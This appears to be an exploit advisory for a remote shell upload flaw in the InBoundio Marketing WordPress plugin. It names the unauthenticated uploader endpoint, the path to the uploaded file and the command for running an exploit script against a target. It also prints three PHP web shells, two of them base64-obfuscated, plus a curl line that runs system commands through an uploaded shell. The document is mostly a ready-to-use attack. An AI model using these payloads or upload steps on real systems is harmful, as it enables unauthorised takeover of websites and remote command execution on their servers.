- WordPress plugin InBoundio Marketing Shell Upload / INURL - BRASIL
------
```
  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil
```
-   Vendor
------
http://www.inboundio.com

-   Vulnerability Description
------
WordPress plugin (InBoundio Marketing) remote shell upload vulnerability.

-   Tool Description
------
The script makes file upload without permission

-   REQUEST POST SEND
------
```
array('file' => "@_YOU_FILE")
```

-   URL REQUEST SEND
------
```
http://{target}/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php
```

-   URL FILE ACCESS
------
```
http://{target}/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/_YOU_FILE
```

-   EXECUTE EXPLOIT
------
```
   -t : SET TARGET.
   -f : SET FILE UPLOAD.
   Execute:
                 php xlp.php -t target -f shell.php
```

-   OUTPUT VULN
------
filename: Exploit_AFU.txt

-   EXEMPLE SHELL UPLOAD
------
```
[+] MODEL-01 CODE >>
<?php $__=@base64_decode("c3lzdGVt");echo@$__(isset($_REQUEST[0])?$_REQUEST[0]:NULL);?>
 
[+] MODEL-02 CODE >>
<?php echo(`{$_REQUEST[0]}`);?>
 
[+] MODEL-03 CODE >>
<?php $_=$_REQUEST[0];@$__=@create_function('$_',base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"));@$__($_);
 
# EXECUTE: curl "http://localhost/of.php?0=uname%20-a%20%26%26%20ls%20-la"
```
-   REFERENCE
------
[1] http://pastebin.com/D07wPKmA
[2] http://k3dsec.blogspot.com/2015/03/wordpress-plugin-inboundio-marketing.html
[3] http://blog.inurl.com.br/2015/03/inurl-brasil-simple-shell-backdoor.html
